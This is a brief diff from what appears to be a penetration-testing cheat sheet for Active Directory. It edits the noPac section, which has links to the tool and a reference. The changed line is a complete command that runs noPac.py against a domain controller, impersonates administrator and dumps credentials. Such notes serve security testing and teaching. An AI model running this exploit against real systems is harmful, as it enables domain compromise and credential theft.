@@ -3540,7 +3540,7 @@ $ https://nv2lt.github.io/windows/CVE-2020-1472-Step-by-Step-Procedure/
 $ https://github.com/Ridter/noPac
 
 => Commands
-$ python3 .\noPac.py bank.local/user:password -dc-ip 10.0.10.10 -dc-host DC01 --impersonate administrator -dump
+$ python3 noPac.py bank.local/user:password -dc-ip 10.0.10.10 -dc-host DC01 --impersonate administrator -dump
 
 => References
 $ https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing
